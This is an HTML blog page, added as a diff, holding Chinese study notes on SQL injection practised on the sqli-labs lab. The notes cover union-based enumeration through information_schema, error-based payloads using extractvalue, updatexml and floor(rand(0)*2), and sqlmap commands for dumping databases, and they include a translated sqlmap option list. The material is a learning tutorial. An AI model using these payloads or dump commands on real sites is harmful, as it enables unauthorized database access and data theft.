@@ -1,0 +1,272 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>lccc | lccc</title><meta name="author" content="Lccc"><meta name="copyright" content="Lccc"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="基础table_schema  数据库名table_name  表名column_schema 列名 增删改语句 查询语句 union联合查询（将前后查询语句一起运行） group by order by     ,        limitand 同时满足                or 满足一个条件 函数 注入顺序先找注入点再判断注入的是字符型还是数字型注入（可以用2-1和1来判断）如果输">
+<meta property="og:type" content="article">
+<meta property="og:title" content="lccc">
+<meta property="og:url" content="http://example.com/2024/08/07/sql%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="lccc">
+<meta property="og:description" content="基础table_schema  数据库名table_name  表名column_schema 列名 增删改语句 查询语句 union联合查询（将前后查询语句一起运行） group by order by     ,        limitand 同时满足                or 满足一个条件 函数 注入顺序先找注入点再判断注入的是字符型还是数字型注入（可以用2-1和1来判断）如果输">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://static.iamxk.com/wp-content/uploads/2019/09/0eadd4bb-dd0f-402a-9e3e-a5afc3b81cd0.jpg">
+<meta property="article:published_time" content="2024-08-07T11:59:31.723Z">
+<meta property="article:modified_time" content="2024-08-07T11:59:36.295Z">
+<meta property="article:author" content="Lccc">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://static.iamxk.com/wp-content/uploads/2019/09/0eadd4bb-dd0f-402a-9e3e-a5afc3b81cd0.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2024/08/07/sql%E6%B3%A8%E5%85%A5/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'lccc',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-08-07 19:59:36'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/mycss.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://static.iamxk.com/wp-content/uploads/2019/09/0eadd4bb-dd0f-402a-9e3e-a5afc3b81cd0.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="lccc"><span class="site-name">lccc</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">无题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-08-07T11:59:31.723Z" title="发表于 2024-08-07 19:59:31">2024-08-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-08-07T11:59:36.295Z" title="更新于 2024-08-07 19:59:36">2024-08-07</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>table_schema  数据库名<br>table_name  表名<br>column_schema 列名</p>
+<h3 id="增删改语句"><a href="#增删改语句" class="headerlink" title="增删改语句"></a>增删改语句</h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1720966250355-e94c12e9-c25a-48a1-83ed-0aef214407ed.png#averageHue=%23636363&clientId=u06c08f24-a9dc-4&from=paste&height=376&id=uf50b26e7&originHeight=470&originWidth=670&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=162874&status=done&style=none&taskId=ub0fe3a86-22c8-4bc2-8692-a832d5d5315&title=&width=536" alt="屏幕截图 2024-07-14 213139.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1720966340734-58e467a2-9198-4fda-bcd4-bda8443911f4.png#averageHue=%23bdbebc&clientId=u06c08f24-a9dc-4&from=paste&height=450&id=u151f293e&originHeight=562&originWidth=1023&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=256087&status=done&style=none&taskId=ue97b583f-2ab7-4ae6-b652-76a121a5b1a&title=&width=818.4" alt="屏幕截图 2024-07-14 213458.png"></p>
+<h3 id="查询语句"><a href="#查询语句" class="headerlink" title="查询语句"></a>查询语句</h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1720966317601-f41080fb-7449-4110-acd0-d0622719e475.png#averageHue=%23d0d0d0&clientId=u06c08f24-a9dc-4&from=paste&height=597&id=uf6ae36f3&originHeight=746&originWidth=1745&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=384381&status=done&style=none&taskId=uba53db1c-2b4f-4892-88b1-b8b050bec38&title=&width=1396" alt="屏幕截图 2024-07-14 214346.png"></p>
+<h4 id="union"><a href="#union" class="headerlink" title="union"></a>union</h4><p>联合查询（将前后查询语句一起运行）<br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1720967028445-7738347d-81aa-4161-bd99-be33840a2f47.png#averageHue=%23cbcbca&clientId=u06c08f24-a9dc-4&from=paste&height=600&id=u1cb9b0b4&originHeight=750&originWidth=1730&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=434269&status=done&style=none&taskId=u555ba54c-7566-477c-b087-053747c55ed&title=&width=1384" alt="image.png"></p>
+<h4 id="group-by"><a href="#group-by" class="headerlink" title="group by"></a>group by</h4><p><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1720967702762-6ee2213e-8f53-4f41-a25d-706255bd038b.png#averageHue=%23cbcaca&clientId=u06c08f24-a9dc-4&from=paste&height=442&id=uf6c9028a&originHeight=552&originWidth=1170&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=171893&status=done&style=none&taskId=u5bfc0bf3-7e16-429f-926b-0fbb35eed76&title=&width=936" alt="image.png"></p>
+<h4 id="order-by-limit"><a href="#order-by-limit" class="headerlink" title="order by     ,        limit"></a>order by     ,        limit</h4><p><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1720967058594-db468837-520b-4aea-9a94-e279ade6456c.png#averageHue=%23dedddd&clientId=u06c08f24-a9dc-4&from=paste&height=686&id=u81c62633&originHeight=858&originWidth=1686&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=376284&status=done&style=none&taskId=u06eb21ac-b522-49ee-8377-047ee0229a6&title=&width=1348.8" alt="屏幕截图 2024-07-14 215625.png"><br>and 同时满足                or 满足一个条件<br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1720967740474-2090217b-3f1b-4168-8fd6-0ac5c92d01e4.png#averageHue=%23868686&clientId=u06c08f24-a9dc-4&from=paste&height=711&id=ud2c8c979&originHeight=889&originWidth=1582&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=433259&status=done&style=none&taskId=ud58dbcac-be55-4898-964d-6a93f85fb19&title=&width=1265.6" alt="屏幕截图 2024-07-14 215938.png"></p>
+<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1720967688201-8a7ec81f-8cb3-4eab-b896-12476a7dc242.png#averageHue=%23bdbdbb&clientId=u06c08f24-a9dc-4&from=paste&height=446&id=uf88ce0ab&originHeight=558&originWidth=1166&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=246650&status=done&style=none&taskId=u9e3e2d53-6d7d-4dc4-bb12-5e3f3876062&title=&width=932.8" alt="image.png"></p>
+<h3 id="注入顺序"><a href="#注入顺序" class="headerlink" title="注入顺序"></a>注入顺序</h3><h4 id="先找注入点"><a href="#先找注入点" class="headerlink" title="先找注入点"></a>先找注入点</h4><p>再判断注入的是字符型还是数字型注入（可以用2-1和1来判断）<br>如果输入为1<br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1721225125687-d06377c3-f55f-43f1-a41d-0d568d28e6fb.png#averageHue=%238bd212&clientId=u91dbdc7e-91e6-4&from=paste&height=266&id=udea809d8&originHeight=333&originWidth=998&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=21924&status=done&style=none&taskId=u0a0fa222-5640-48fb-a62e-c216321911d&title=&width=798.4" alt="image.png">再输入2-1       如果两种显示相同则是数字型（如果用1&#x3D;2，也可以，但是用1+2，加号可能会被识别成空格）<img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1721225172070-cd193b23-e896-40cc-b047-07b650c1d068.png#averageHue=%238bd90b&clientId=u91dbdc7e-91e6-4&from=paste&height=326&id=u3f2a819e&originHeight=407&originWidth=742&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=44639&status=done&style=none&taskId=u3864a768-0d8d-4d50-8f60-cc2a1adb03c&title=&width=593.6" alt="image.png"></p>
+<h4 id="再判断闭合方式（字符型，数字型不需要闭合）"><a href="#再判断闭合方式（字符型，数字型不需要闭合）" class="headerlink" title="再判断闭合方式（字符型，数字型不需要闭合）"></a>再判断闭合方式（字符型，数字型不需要闭合）</h4><p>闭合的原因是为了将注入值和后面执行的sql语句分开<br>就是？id&#x3D;这个后面的内容是一个整体如果里面包含了正确的闭合符号就会导致系统帮你输入的闭合符号单独多出来，就是靠这样来判断闭合方式的，如果会回显报错就输入转义符 如 &#x2F;<br>可以输入?id&#x3D;1’<br>后面的‘‘1’’LMIT 0,1’ at line 1(在这个报错语句里面1’这里的单引号没有对应的另一个单引号，而另外两个单引号就是判断他闭合方式的)</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1721225617375-b6fbfe8a-ff15-4c82-bd8c-99f1a3c98ac1.png#averageHue=%236a6a68&clientId=u91dbdc7e-91e6-4&from=paste&height=384&id=uf492e80c&originHeight=480&originWidth=1610&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=154943&status=done&style=none&taskId=u0dfebee1-a83b-48e5-b64a-4796a26ddf1&title=&width=1288" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1721225349379-ec5cc076-9d1c-486e-9b60-529e1131e6f4.png#averageHue=%23f8f8f7&clientId=u91dbdc7e-91e6-4&from=paste&height=112&id=u398dadd6&originHeight=140&originWidth=471&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=34472&status=done&style=none&taskId=u380c7aee-98b9-41e0-904a-1a5b7b9f810&title=&width=376.8" alt="image.png"><br>这个注释相当于把上面的从LIMT 0,1’开始这部分注释掉了，让一开始没有对应的单引号	有了对应的单引号<br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1721225535117-ea76f645-4039-49fa-bc86-7aec63c5a81a.png#averageHue=%23fafbf7&clientId=u91dbdc7e-91e6-4&from=paste&height=229&id=ua020f7c4&originHeight=286&originWidth=590&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=132168&status=done&style=none&taskId=u0e548c6a-14ea-4c32-8552-2571f09547c&title=&width=472" alt="image.png"></p>
+<h4 id="判断查询列数的长短"><a href="#判断查询列数的长短" class="headerlink" title="判断查询列数的长短"></a>判断查询列数的长短</h4><p>用group by 和 order by ，<br>判断id&#x3D;1的这一行有多少列<br>可以先在3的位置输入较大的数字，用二分法来判断<br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1721227418953-9597ea07-a28a-4929-8c90-1f64878847ec.png#averageHue=%235b5a5a&clientId=u91dbdc7e-91e6-4&from=paste&height=366&id=u1e245069&originHeight=458&originWidth=1577&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=158013&status=done&style=none&taskId=u853ffee7-defe-4336-8802-0a81c82f13e&title=&width=1261.6" alt="image.png"></p>
+<h4 id="查询回显位置"><a href="#查询回显位置" class="headerlink" title="查询回显位置"></a>查询回显位置</h4><p>可以先将union select 前部分的id注入一个数据库里面没有的id，这样就可以显示后面所显示的部分，<br>通过把1，2，3这三个数字的位置改成database（）查看回显位置<br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1721227150915-c994fc7a-7769-444a-8a38-cff3d70dc9ef.png#averageHue=%23535352&clientId=u91dbdc7e-91e6-4&from=paste&height=374&id=ua183bdfa&originHeight=467&originWidth=1548&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=156047&status=done&style=none&taskId=uea0c62f4-4223-4373-b9b4-584d73fb5ab&title=&width=1238.4" alt="image.png"><br>这里是更改了2的位置<br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1721227247995-ffc1f6ca-084b-4622-94a9-2fa897b832ab.png#averageHue=%23676767&clientId=u91dbdc7e-91e6-4&from=paste&height=334&id=u5916d50f&originHeight=417&originWidth=1646&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=157288&status=done&style=none&taskId=u58932ff0-8a07-4408-9b2f-0586f42b302&title=&width=1316.8" alt="image.png">然后查询到了security这个名字就是目前对应的库名，然后就是要拿到表名和列名<br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1721229177195-2c5d8ce7-4eb0-4350-bcae-8c9d4b6de115.png#averageHue=%23fcfcfb&clientId=u91dbdc7e-91e6-4&from=paste&height=375&id=ua4ce55f4&originHeight=469&originWidth=1140&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=164836&status=done&style=none&taskId=ub60d4b4d-d5fd-4a85-9776-706431650ff&title=&width=912" alt="屏幕截图 2024-07-17 225240.png"><br>Information_schema系统自带的数据库库名，因为这个数据库里面的tables表包含了所有数据库的表名<br>columns这个表就是包含了所有数据库里面的所有列名</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1721229345055-0be1dc4e-0252-45f8-9ee0-bb4d9754f6fe.png#averageHue=%239e9d9b&clientId=u91dbdc7e-91e6-4&from=paste&height=578&id=u6a018a60&originHeight=723&originWidth=1281&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=385426&status=done&style=none&taskId=u77d1dcba-d990-4681-9465-480986f9489&title=&width=1024.8" alt="屏幕截图 2024-07-17 225846.png"><br>在用group_concat的时候不能在后面接空格   如group_concat ()这种写法是错误的<br>json_arrayagg()和这个效果差不多<br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1721229435396-c87683f5-02bf-4595-bc67-8c794abc643a.png#averageHue=%239d9c9c&clientId=u91dbdc7e-91e6-4&from=paste&height=379&id=u134e3acb&originHeight=474&originWidth=1245&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=244877&status=done&style=none&taskId=u97de07b5-9e85-46ff-9466-89fc0bf1636&title=&width=996" alt="屏幕截图 2024-07-17 230015.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1721229444741-bec50c26-8824-467c-8363-f47698b5a274.png#averageHue=%23bbbbb9&clientId=u91dbdc7e-91e6-4&from=paste&height=598&id=u3cce8a34&originHeight=748&originWidth=1297&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=347289&status=done&style=none&taskId=u1f80d6d2-a191-412b-88d0-c8c20539020&title=&width=1037.6" alt="屏幕截图 2024-07-17 230521.png"></p>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>通常用于没有找到回显位置的时候<br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1721315646917-b5b9f7e2-e321-44b7-989a-f9ba99831a2e.png#averageHue=%23f2f8ef&clientId=u2c29e7f5-d462-4&from=paste&height=432&id=uddde7d16&originHeight=540&originWidth=1847&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=735205&status=done&style=none&taskId=u004b7017-7d75-4bd1-8cfc-9bfe85fb064&title=&width=1477.6" alt="屏幕截图 2024-07-18 220636.png"></p>
+<h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><p>extractvalue(1,concat(0x7e,(select database())))<br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1721315663858-f37dc71e-f3a4-4b47-9923-59e5fdcd7341.png#averageHue=%23ecf2d2&clientId=u2c29e7f5-d462-4&from=paste&height=180&id=u77d21682&originHeight=225&originWidth=1777&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=186149&status=done&style=none&taskId=u0cfc7d57-bd67-48eb-b3be-521802c1ecd&title=&width=1421.6" alt="屏幕截图 2024-07-18 221339.png"><br>concat(1，2)表示将这两个参数拼接起来就是让前面的一个参数产生报错在和后面的sql注入语句连接起来，这样就可以让后面的sql语句在报错回显的地方显示出来<br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1721316195613-91059047-4ac7-4462-9c57-131fc0373d97.png#averageHue=%23a09877&clientId=u2c29e7f5-d462-4&from=paste&height=378&id=ua0f9b1e7&originHeight=472&originWidth=1232&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=256762&status=done&style=none&taskId=u4d4a0ab5-8a97-40ef-900c-d9cc9be97f3&title=&width=985.6" alt="屏幕截图 2024-07-18 231122.png"></p>
+<p>由于extractvalue只能返回32个字符所以要用到substring来显示后面的数据，再通过自己和前面的数据进行拼接，但是还是在页面中只能显示32个字符，只是这32个字符所代表的字符位置不一样<br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1721315981933-399e4c63-1c73-40bb-bb17-78710832af63.png#averageHue=%23f5f5f0&clientId=u2c29e7f5-d462-4&from=paste&height=228&id=u3b8f5079&originHeight=285&originWidth=1681&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=302970&status=done&style=none&taskId=uefafefc3-a24d-4981-9d55-e94ff1c4ba7&title=&width=1344.8" alt="屏幕截图 2024-07-18 221935.png"></p>
+<h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h4><p><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1721391448403-7badb653-19ea-4050-9c39-2bbe4c33dcd6.png#averageHue=%23fafaf9&clientId=u2eb2b66e-049c-4&from=paste&height=96&id=u69743035&originHeight=120&originWidth=872&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=39690&status=done&style=none&taskId=ub104dec0-b5e6-4093-b38e-bcf04b2d964&title=&width=697.6" alt="屏幕截图 2024-07-19 195701.png"></p>
+<h4 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h4><p><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1721394275132-b1ceae33-776b-40df-9bcc-58b8c70e9be9.png#averageHue=%23edf3cf&clientId=u2eb2b66e-049c-4&from=paste&height=537&id=XH5tl&originHeight=671&originWidth=1347&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=474206&status=done&style=none&taskId=uf7c36ec1-c9e4-4938-b8a4-4f707dc12c6&title=&width=1077.6" alt="屏幕截图 2024-07-19 202318.png"><br>通过rand（0）<em>2会固定显示0和1中的随机一个，因为count（）会统计数量，在对rand（0）</em>2统计数量时，第一个计算进去的数字是不会显示的要看第二个计算进去的数字才会对其计数，如果rand（0）*2显示的是0，1，1，1  那么先进行计数的是1，而不是0，因为0是第一个计算的，不会对其统计而是记上个数1，等第二个1计算的时候就会对其进行统计因为一开始就已经记上了个数1，但也会统计在1这一类，相当于在第二个位置1计算进去的时候就有两个1的数量了，为什么会报错，是因为再次碰到0的时候又会记上个数1但是没有统计0，所以还会计算下一个数字，如果下一个数字又是1，那么由于统计的两个名称都是1所以产生了报错<br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1721544942031-61b96464-1433-48a4-8e91-13fc1f901a63.png#averageHue=%23ebf0d3&clientId=u724a8feb-5a65-4&from=paste&height=615&id=u32250a00&originHeight=769&originWidth=1777&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=740533&status=done&style=none&taskId=u3a0fc0ea-5dc1-42dc-a06f-1f9b3bee0b9&title=&width=1421.6" alt="屏幕截图 2024-07-21 142020.png"></p>
+<h5 id="rand-函数"><a href="#rand-函数" class="headerlink" title="rand()函数"></a>rand()函数</h5><p><img src="https://cdn.nlark.com/yuque/0/2024/png/46296056/1721394380874-152e9913-bd96-496c-9da8-354642350d70.png#averageHue=%23e3eddb&clientId=u2eb2b66e-049c-4&from=paste&height=384&id=neDvJ&originHeight=480&originWidth=914&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=346802&status=done&style=none&taskId=u0620790f-8c67-40bf-a935-e08633e08ef&title=&width=731.2" alt="屏幕截图 2024-07-19 210556.png"></p>
+<h5 id="concat-ws-1，2，3-函数"><a href="#concat-ws-1，2，3-函数" class="headerlink" title="concat_ws(1，2，3)函数"></a>concat_ws(1，2，3)函数</h5><p>，，执行结果为213，就是第一位的符号用来当拼接第二位和第三位的符号</p>
+<h5 id="as别名，group-by分组"><a href="#as别名，group-by分组" class="headerlink" title="as别名，group by分组"></a>as别名，group by分组</h5><h5 id="count-汇总统计数量"><a href="#count-汇总统计数量" class="headerlink" title="count()汇总统计数量"></a>count()汇总统计数量</h5><h5 id="floor-rand-0-2-用来报错"><a href="#floor-rand-0-2-用来报错" class="headerlink" title="floor(rand(0)*2)用来报错"></a>floor(rand(0)*2)用来报错</h5><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>在页面没回显位且没报错的时候使用，通常是使用工具来爆破</p>
+<h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><p>D:\lll\sqlmap-master&gt;python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://sqli-labs-master/Less-8/?id=1">http://sqli-labs-master/Less-8/?id=1</a> “ –dbs 爆出所有数据库名</p>
+<p>D:\lll\sqlmap-master&gt;python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://sqli-labs-master/Less-8/?id=1">http://sqli-labs-master/Less-8/?id=1</a> “ -D 数据库名–tables  爆出数据库里面的所有表</p>
+<p>D:\lll\sqlmap-master&gt;python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://sqli-labs-master/Less-8/?id=1">http://sqli-labs-master/Less-8/?id=1</a> “ -D 数据库名 -T 表名 –dump  爆出所有内容<br> -h, –help            Show basic help message and exit<br>                        显示基本帮助信息并退出<br>  -hh                   Show advanced help message and exit<br>                        显示高级帮助信息并退出<br>  –version             Show program’s version number and exit<br>                        显示程序的版本号并退出<br>  -v VERBOSE            Verbosity level: 0-6 (default 1)<br>                        详细程度级别：0-6（默认1）</p>
+<p>  Target:<br>    At least one of these options has to be provided to define the<br>    target(s)<br>    目标：<br>      必须提供至少一个选项来定义目标</p>
+<pre><code>-u URL, --url=URL   Target URL (e.g. &quot;[http://www.site.com/vuln.php?id=1&quot;)](http://www.site.com/vuln.php?id=1&quot;))
+                    目标URL（例如：&quot;[http://www.site.com/vuln.php?id=1&quot;](http://www.site.com/vuln.php?id=1&quot;)）
+-g GOOGLEDORK       Process Google dork results as target URLs
+                    将Google dork结果处理为目标URL
+</code></pre>
+<p>  Request:<br>    These options can be used to specify how to connect to the target URL<br>    请求：<br>      这些选项可用于指定如何连接到目标URL</p>
+<pre><code>--data=DATA         Data string to be sent through POST (e.g. &quot;id=1&quot;)
+                    要通过POST发送的数据字符串（例如：&quot;id=1&quot;）
+--cookie=COOKIE     HTTP Cookie header value (e.g. &quot;PHPSESSID=a8d127e..&quot;)
+                    HTTP Cookie头值（例如：&quot;PHPSESSID=a8d127e..&quot;）
+--random-agent      Use randomly selected HTTP User-Agent header value
+                    使用随机选择的HTTP User-Agent头值
+--proxy=PROXY       Use a proxy to connect to the target URL
+                    使用代理连接到目标URL
+--tor               Use Tor anonymity network
+                    使用Tor匿名网络
+--check-tor         Check to see if Tor is used properly
+                    检查Tor是否正常使用
+</code></pre>
+<p>  Injection:<br>    These options can be used to specify which parameters to test for,<br>    provide custom injection payloads and optional tampering scripts<br>    注入：<br>      这些选项可用于指定要测试的参数，提供自定义注入负载和可选的篡改脚本</p>
+<pre><code>-p TESTPARAMETER    Testable parameter(s)
+                    可测试的参数
+--dbms=DBMS         Force back-end DBMS to provided value
+                    强制后端DBMS为提供的值
+</code></pre>
+<p>  Detection:<br>    检测：</p>
+<pre><code>--level=LEVEL       Level of tests to perform (1-5, default 1)
+                    执行测试的级别（1-5，默认1）
+--risk=RISK         Risk of tests to perform (1-3, default 1)
+                    执行测试的风险级别（1-3，默认1）
+</code></pre>
+<p>  Techniques:<br>    These options can be used to tweak testing of specific SQL injection<br>    techniques<br>    技巧：<br>      这些选项可用于调整特定SQL注入技巧的测试</p>
+<pre><code>--technique=TECH..  SQL injection techniques to use (default &quot;BEUSTQ&quot;)
+                    要使用的SQL注入技巧（默认&quot;BEUSTQ&quot;）
+</code></pre>
+<p>  Enumeration:<br>    These options can be used to enumerate the back-end database<br>    management system information, structure and data contained in the<br>    tables<br>    枚举：<br>      这些选项可用于枚举后端数据库管理系统的信息、结构以及表中包含的数据</p>
+<pre><code>-a, --all           Retrieve everything
+                    检索所有内容
+-b, --banner        Retrieve DBMS banner
+                    检索DBMS横幅
+--current-user      Retrieve DBMS current user
+                    检索DBMS当前用户
+--current-db        Retrieve DBMS current database
+                    检索DBMS当前数据库
+--passwords         Enumerate DBMS users password hashes
+                    枚举DBMS用户的密码哈希
+--dbs               Enumerate DBMS databases
+                    枚举DBMS数据库
+--tables            Enumerate DBMS database tables
+                    枚举DBMS数据库表
